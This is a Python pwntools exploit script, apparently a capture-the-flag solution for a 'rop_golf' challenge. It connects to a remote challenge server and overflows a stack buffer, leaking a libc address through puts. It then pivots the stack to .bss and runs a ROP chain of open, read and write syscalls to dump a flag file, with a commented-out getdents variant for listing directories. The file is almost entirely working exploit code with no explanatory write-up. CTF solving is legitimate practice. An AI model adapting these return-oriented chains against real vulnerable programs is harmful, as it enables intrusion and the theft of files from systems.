#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")

exe = ELF('./rop_golf_patched')
libc = ELF('./libc.so.6')

host, port = "206.189.113.236", "30674"

p = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")

pop_rdi = 0x00000000004011fb # pop rdi ; ret
pop_rbp = 0x0000000000401129 # pop rbp ; ret
leave_ret = 0x0000000000401161 # leave ; ret

# 1st payload, first we leak puts got entry to calculate libc base, then return to vuln
payload = b'A'*0x28+p64(pop_rdi)+p64(exe.got['puts'])+p64(exe.sym['puts'])+p64(0x401142)
p.sendafter('hi!\n', payload)

# calculate libc base
leak = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))
print('leak = '+hex(leak))
libc.address = leak - libc.sym['puts']
print('libc base = '+hex(libc.address))

# 2nd payload, read the first payload on .bss and pivot to it
bss = 0x404c00
onegadgets = one_gadget('libc.so.6', libc.address)
payload = b'A'*0x20+p64(bss+64-8)+p64(pop_rdi)+p64(bss)+p64(libc.sym['gets'])+p64(leave_ret)
p.send(payload)

# various gadgets
pop_rdx = libc.address + 0x0000000000044198 # pop rdx ; ret
pop_rsi = libc.address + 0x000000000002440e # pop rsi ; ret
pop_rax = libc.address + 0x000000000003a638 # pop rax ; ret
xchg_edi_eax = libc.address + 0x0000000000116dbc # xchg eax, edi ; ret
syscall_ret = libc.address + 0x00000000000b58a5 # syscall; ret;
fname = b'/pwn/066A2462DEB399BA9183A91FC116914C.txt'
fname = fname.ljust(64,b'\x00')

#Â 3rd oayload with fname gonna dump
# open fname
payload4 = fname + p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
# read file
payload4 += p64(xchg_edi_eax)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x80)+p64(pop_rax)+p64(0)+p64(syscall_ret)
# write file content to stdout
payload4 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x80)+p64(pop_rax)+p64(1)+p64(syscall_ret)
#exit
payload4 += p64(pop_rax)+p64(60)+p64(syscall_ret)
p.sendline(payload4)

# alternative payload that does getdents, and return directory content 
#payload4 = fname + p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
#payload4 += p64(xchg_edi_eax)+p64(pop_rsi)+p64(bss-0x100)+p64(pop_rdx)+p64(0x200)+p64(pop_rax)+p64(78)+p64(syscall_ret)
#payload4 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss-0x100)+p64(pop_rdx)+p64(0x200)+p64(pop_rax)+p64(1)+p64(syscall_ret)
#payload4 += p64(pop_rax)+p64(60)+p64(syscall_ret)
#p.sendline(payload4)

#buff = p.recv()
#print(dirents(buff))

p.interactive()

